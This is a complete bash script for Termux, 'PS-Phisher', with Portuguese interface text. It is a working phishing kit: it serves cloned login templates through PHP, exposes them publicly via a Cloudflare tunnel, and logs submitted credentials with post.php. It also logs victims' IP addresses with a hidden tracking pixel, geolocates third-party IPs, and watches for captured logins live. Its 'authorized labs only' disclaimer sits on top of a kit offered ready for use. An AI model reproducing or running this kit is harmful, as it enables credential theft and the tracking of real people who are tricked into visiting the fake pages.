#!/data/data/com.termux/files/usr/bin/bash
# ======================================================================
#  PS-Phish - Ferramenta de Simulação de Phishing
#  Autor: PeekSecurity Team
#  Uso exclusivo em laboratórios autorizados.
#  Versão: 3.0
# ======================================================================

# ----------------------------- CONFIGURAÇÕES ----------------------------
HOST="127.0.0.1"
PORT="8080"
SITES_DIR=".sites"
WWW_DIR=".server/www"
SERVER_DIR=".server"
CAPTURE_DIR=".server/captures"
LOG_FILE="$SERVER_DIR/ps-phisher.log"

# Cores neon / matrix
BOLD="\033[1m"
RED="\033[91m"
GREEN="\033[92m"
YELLOW="\033[93m"
CYAN="\033[96m"
WHITE="\033[97m"
BG_RED="\033[101m"
NEON_GREEN="\033[38;2;0;255;128m"
NEON_BLUE="\033[38;2;0;255;255m"
MATRIX_COLOR="\033[38;2;0;255;0m"

# ----------------------------- BANNER MATRIX ----------------------------
banner() {
    clear
    echo -e "${MATRIX_COLOR}"
    echo "  [+] ======================================== [+]"
    echo "  [+}                                          {+]"
    echo "  [+]            PS-Phisher v3.2               [+]"
    echo "  [+]          PeekSecurity Team               [+]"
    echo "  [+}                                          {+]"
    echo "  [+] ======================================== [+]${RESET}"
    echo
}

small_banner() {
    clear
    echo -e "${NEON_GREEN}"
    echo "  [*] ========== PS-Phisher Mode ========== [*]${RESET}\n"
}

# ----------------------------- UTILITÁRIOS -------------------------------
log_event() { echo -e "$(date +'%H:%M:%S') - $1" >> "$LOG_FILE"; }
die() { echo -e "\n${RED}[!] $1${RESET}"; log_event "ERRO: $1"; exit 1; }
check_termux() { [[ ! -d /data/data/com.termux ]] && die "Execute no Termux."; }
setup_dirs() { mkdir -p "$WWW_DIR" "$CAPTURE_DIR" "$SERVER_DIR" 2>/dev/null; rm -rf "$WWW_DIR"/* 2>/dev/null; touch "$LOG_FILE"; }

dependencies() {
    echo -e "${NEON_GREEN}[+] Verificando dependências...${RESET}"
    local deps=("php" "curl" "wget" "unzip" "jq")
    local missing=()
    for dep in "${deps[@]}"; do
        command -v "$dep" &>/dev/null || missing+=("$dep")
    done
    if [[ ${#missing[@]} -gt 0 ]]; then
        echo -e "${YELLOW}[!] Instalando: ${missing[*]}${RESET}"
        pkg update -y && pkg install -y "${missing[@]}" || die "Falha na instalação."
    else
        echo -e "${GREEN}[✓] Todas as dependências OK.${RESET}"
    fi
}

# ----------------------------- IP LOOKUP (próprio e terceiros) ----------
ip_lookup_menu() {
    small_banner
    echo -e "${CYAN}═════════════════ IP LOOKUP ═════════════════${RESET}"
    echo -e "  ${GREEN}[1]${RESET} Meu IP público + Geolocalização"
    echo -e "  ${GREEN}[2]${RESET} Consultar IP de terceiros"
    echo -e "  ${GREEN}[3]${RESET} Voltar ao menu principal"
    echo -ne "${YELLOW}➜ Escolha: ${RESET}"
    read -r ip_choice
    case $ip_choice in
        1)
            echo -e "${CYAN}[+] Obtendo seu IP público...${RESET}"
            my_ip=$(curl -s -4 ifconfig.co)
            if [[ -n "$my_ip" ]]; then
                echo -e "${NEON_GREEN}[✓] Seu IP público: ${NEON_BLUE}$my_ip${RESET}"
                geo=$(curl -s "http://ip-api.com/json/$my_ip" | jq -r '.city, .region_name, .country' | paste -d ', ' - - -)
                echo -e "${GREEN}[✓] Localização aproximada: ${YELLOW}$geo${RESET}"
            else
                echo -e "${RED}[!] Falha ao obter IP. Verifique a internet.${RESET}"
            fi
            echo -e "\n${DIM}Pressione Enter para continuar...${RESET}"
            read -r
            ip_lookup_menu
            ;;
        2)
            echo -ne "${CYAN}➜ Digite o IP alvo: ${RESET}"
            read -r target_ip
            if [[ -n "$target_ip" ]]; then
                echo -e "${CYAN}[+] Consultando IP $target_ip...${RESET}"
                data=$(curl -s "http://ip-api.com/json/$target_ip")
                status=$(echo "$data" | jq -r '.status')
                if [[ "$status" == "success" ]]; then
                    city=$(echo "$data" | jq -r '.city')
                    region=$(echo "$data" | jq -r '.regionName')
                    country=$(echo "$data" | jq -r '.country')
                    isp=$(echo "$data" | jq -r '.isp')
                    lat=$(echo "$data" | jq -r '.lat')
                    lon=$(echo "$data" | jq -r '.lon')
                    echo -e "${GREEN}[✓] Resultado:${RESET}"
                    echo -e "    ${YELLOW}📍 Localização:${RESET} $city, $region, $country"
                    echo -e "    ${YELLOW}📡 ISP:${RESET} $isp"
                    echo -e "    ${YELLOW}🗺️ Coordenadas:${RESET} $lat, $lon"
                else
                    echo -e "${RED}[!] IP inválido ou não encontrado.${RESET}"
                fi
            else
                echo -e "${RED}[!] Nenhum IP fornecido.${RESET}"
            fi
            echo -e "\n${DIM}Pressione Enter para continuar...${RESET}"
            read -r
            ip_lookup_menu
            ;;
        3) main_menu ;;
        *) ip_lookup_menu ;;
    esac
}

# ----------------------------- TÚNEIS ------------------------------------
install_cloudflared() {
    if [[ -x "$SERVER_DIR/cloudflared" ]]; then
        echo -e "${GREEN}[✓] Cloudflared já instalado.${RESET}"
        return
    fi
    echo -e "${CYAN}[+] Baixando cloudflared...${RESET}"
    local arch=$(uname -m)
    local url=""
    case "$arch" in
        aarch64) url="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64" ;;
        armv7l|armv8l) url="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm" ;;
        x86_64) url="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64" ;;
        i686) url="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386" ;;
        *) die "Arquitetura não suportada: $arch" ;;
    esac
    wget -q --show-progress -O "$SERVER_DIR/cloudflared" "$url" || die "Download falhou."
    chmod +x "$SERVER_DIR/cloudflared"
    echo -e "${GREEN}[✓] Cloudflared instalado.${RESET}"
}

get_cloudflared_url() {
    local log_file="$1"
    for ((i=1; i<=20; i++)); do
        if [[ -f "$log_file" ]]; then
            local url=$(grep -o 'https://[-a-zA-Z0-9.]*\.trycloudflare.com' "$log_file" | head -1)
            [[ -n "$url" ]] && echo "$url" && return 0
        fi
        sleep 1
    done
    return 1
}

start_cloudflared() {
    echo -e "${CYAN}[+] Iniciando Cloudflared...${RESET}"
    "$SERVER_DIR/cloudflared" tunnel --url "http://$HOST:$PORT" --logfile "$SERVER_DIR/cf.log" > /dev/null 2>&1 &
    local tunnel_url=$(get_cloudflared_url "$SERVER_DIR/cf.log")
    [[ -z "$tunnel_url" ]] && die "Não foi possível obter URL do Cloudflared."
    echo "$tunnel_url" > "$SERVER_DIR/url.txt"
    echo -e "${GREEN}[✓] Túnel ativo: ${NEON_BLUE}$tunnel_url${RESET}"
}

start_localhost() {
    echo -e "${CYAN}[+] Modo Localhost: http://$HOST:$PORT${RESET}"
    echo "http://$HOST:$PORT" > "$SERVER_DIR/url.txt"
}

# ----------------------------- PHP E TEMPLATES ---------------------------
start_php_server() {
    echo -e "${CYAN}[+] Iniciando servidor PHP...${RESET}"
    cd "$WWW_DIR" || die "Diretório WWW inacessível."
    php -S "$HOST":"$PORT" > /dev/null 2>&1 &
    PHP_PID=$!
    sleep 2
    kill -0 $PHP_PID 2>/dev/null || die "Falha ao iniciar PHP."
    cd - >/dev/null
}

deploy_template() {
    local site="$1"
    [[ ! -d "$SITES_DIR/$site" ]] && die "Template '$site' não encontrado."
    echo -e "${CYAN}[+] Implantando template: $site${RESET}"
    cp -r "$SITES_DIR/$site"/* "$WWW_DIR/"
    # ip.php (captura IP e retorna pixel invisível)
    cat > "$WWW_DIR/ip.php" <<'EOF'
<?php
$ip = $_SERVER['REMOTE_ADDR'];
if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
$ip = trim(explode(',', $ip)[0]);
file_put_contents("ip.txt", "[" . date("Y-m-d H:i:s") . "] IP: $ip\n", FILE_APPEND);
header('Content-Type: image/gif');
echo base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7');
?>
EOF
    # post.php (captura credenciais)
    cat > "$WWW_DIR/post.php" <<'EOF'
<?php
if ($_POST) {
    $data = "[" . date("Y-m-d H:i:s") . "] ";
    foreach ($_POST as $k => $v) $data .= ucfirst($k) . ": $v | ";
    file_put_contents("usernames.txt", $data . PHP_EOL, FILE_APPEND);
}
header("Location: https://www.google.com");
exit;
?>
EOF
}

# ----------------------------- MONITOR DE CAPTURAS AO VIVO --------------
monitor_capture() {
    echo -e "${GREEN}[+] Monitorando capturas (IP e credenciais)...${RESET}"
    echo -e "${YELLOW}    Pressione Ctrl+C para interromper.${RESET}\n"
    while true; do
        if [[ -f "$WWW_DIR/ip.txt" ]]; then
            echo -e "${BG_RED}${WHITE}[!] NOVO IP CAPTURADO${RESET}"
            cat "$WWW_DIR/ip.txt"
            cat "$WWW_DIR/ip.txt" >> "$CAPTURE_DIR/ip_$(date +%s).txt"
            rm -f "$WWW_DIR/ip.txt"
        fi
        if [[ -f "$WWW_DIR/usernames.txt" ]]; then
            echo -e "${BG_RED}${WHITE}[!] CREDENCIAIS CAPTURADAS${RESET}"
            cat "$WWW_DIR/usernames.txt"
            cat "$WWW_DIR/usernames.txt" >> "$CAPTURE_DIR/creds_$(date +%s).txt"
            rm -f "$WWW_DIR/usernames.txt"
        fi
        sleep 0.5
    done
}

# ----------------------------- MENU DE TEMPLATES -------------------------
list_templates() {
    local templates=()
    for d in "$SITES_DIR"/*/; do
        [[ -d "$d" ]] && templates+=("$(basename "$d")")
    done
    [[ ${#templates[@]} -eq 0 ]] && die "Nenhum template encontrado em $SITES_DIR"
    small_banner
    echo -e "${CYAN}═════════════ TEMPLATES DISPONÍVEIS ═════════════${RESET}"
    for i in "${!templates[@]}"; do
        printf "  ${GREEN}[%2d]${RESET} %-15s" $((i+1)) "${templates[$i]}"
        [[ $(( (i+1) % 2 )) -eq 0 ]] && echo
    done
    [[ $(( ${#templates[@]} % 2 )) -ne 0 ]] && echo
    echo -e "\n  ${RED}[0]${RESET} Sair"
    echo -e "  ${NEON_GREEN}[99]${RESET} IP Lookup"
    echo -ne "\n${YELLOW}➜ Escolha: ${RESET}"
    read -r choice
    case $choice in
        0) exit 0 ;;
        99) ip_lookup_menu ;;
        *)
            if [[ "$choice" =~ ^[0-9]+$ ]] && (( choice >= 1 && choice <= ${#templates[@]} )); then
                SELECTED_TEMPLATE="${templates[$((choice-1))]}"
                tunnel_menu
            else
                echo -e "${RED}[!] Opção inválida.${RESET}"
                sleep 1
                list_templates
            fi
            ;;
    esac
}

tunnel_menu() {
    small_banner
    echo -e "${CYAN}═══════════════ MÉTODO DE EXPOSIÇÃO ═══════════════${RESET}"
    echo -e "  ${GREEN}[1]${RESET} Localhost (apenas rede local)"
    echo -e "  ${GREEN}[2]${RESET} Cloudflared   (túnel público)"
    echo -ne "\n${YELLOW}➜ Escolha: ${RESET}"
    read -r tun
    TUNNEL="localhost"
    [[ "$tun" == "2" ]] && TUNNEL="cloudflared"
    start_attack
}

start_attack() {
    deploy_template "$SELECTED_TEMPLATE"
    start_php_server
    case "$TUNNEL" in
        localhost) start_localhost ;;
        cloudflared) start_cloudflared ;;
    esac
    echo -e "\n${GREEN}[✓] Serviço rodando. URL(s):${RESET}"
    cat "$SERVER_DIR/url.txt" 2>/dev/null | while read url; do echo -e "    ${CYAN}$url${RESET}"; done
    echo -e "\n${MATRIX_COLOR}🔍 Aguardando interação da vítima...${RESET}\n"
    monitor_capture
}

# ----------------------------- MENU PRINCIPAL ----------------------------
main_menu() {
    banner
    echo -e "${CYAN}  ╔══════════════════════════════════════════╗${RESET}"
    echo -e "${CYAN}  ║  [1] Iniciar Ataque (Phishing)           ║${RESET}"
    echo -e "${CYAN}  ║  [2] Consultas de IP (Lookup)            ║${RESET}"
    echo -e "${CYAN}  ║  [0] Sair                                ║${RESET}"
    echo -e "${CYAN}  ╚══════════════════════════════════════════╝${RESET}"
    echo -ne "${YELLOW}➜ Escolha: ${RESET}"
    read -r main_choice
    case $main_choice in
        1) list_templates ;;
        2) ip_lookup_menu ;;
        0) echo -e "\n${GREEN}[+] Saindo...${RESET}"; exit 0 ;;
        *) main_menu ;;
    esac
}

# ----------------------------- LIMPEZA E MAIN ----------------------------
cleanup() {
    echo -e "\n${YELLOW}[!] Encerrando processos...${RESET}"
    pkill -f "php -S $HOST:$PORT" 2>/dev/null
    pkill -f "$SERVER_DIR/cloudflared" 2>/dev/null
    echo -e "${GREEN}[✓] Limpeza concluída.${RESET}"
    exit 0
}

main() {
    trap cleanup INT TERM
    check_termux
    dependencies
    setup_dirs
    install_cloudflared
    main_menu
}

main
